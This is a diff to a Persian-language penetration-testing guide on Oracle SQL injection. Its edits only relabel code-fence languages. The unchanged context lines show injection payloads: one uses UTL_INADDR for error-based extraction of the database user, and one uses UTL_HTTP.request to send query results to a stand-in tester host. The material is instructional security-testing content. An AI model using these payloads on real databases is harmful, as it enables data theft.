@@ -21,7 +21,7 @@ http://www.example.com/product.php?id=10
 http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
 ```
 در این مثال، تست نفوذگر مقدار ۱۰ را با نتیجه تابع UTL_INADDR.GET_HOST_NAMEالحاق می‌کند. این تابع در Oracle تلاش خواهد کرد تا Hostname پارامتری که به آن ارسال شده است را بازگرداند که عبارت دیگر کوئری، نام کاربر است. زمانی که پایگاه‌داده به دنبال یک نام میزبان با نام پایگاه‌داده کاربر باشد، شکست خواهد خورد و یک پیغام خطا مانند زیر نمایش می‌دهد:
-```error
+```text
 ORA-292257: host SCOTT unknown
 ```
 سپس تست نفوذگر می‌تواند پارامتر منتقل‌شده به تابع GET_HOST_NAME() را دستکاری کند و نتیجه در پیام خطا نشان داده خواهد شد.
@@ -40,7 +40,7 @@ http://www.example.com/product.php?id=10
 ```
 
 درخواست بدخواهانه می‌تواند به شکل زیر باشد:
-```url
+```sql
 http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80' || (SELECT user FROM DUAL)--
 ```
 در این مثال، تست نفوگر مقدار ۱۰ را با نتیجه تابع UTL_HTTP.requestبه هم متصل می‌کند. این تابع Oracle تلاش خواهد کرد تا به testerserver متصل شود و یک درخواست HTTP GET شامل بازگشت از کاربر SELECT پرس و جو از DAL ایجاد کند. تستر می‌تواند یک وب سرور (‏به عنوان مثال Apache)‏ایجاد کند یا از ابزار Netcat استفاده کند:
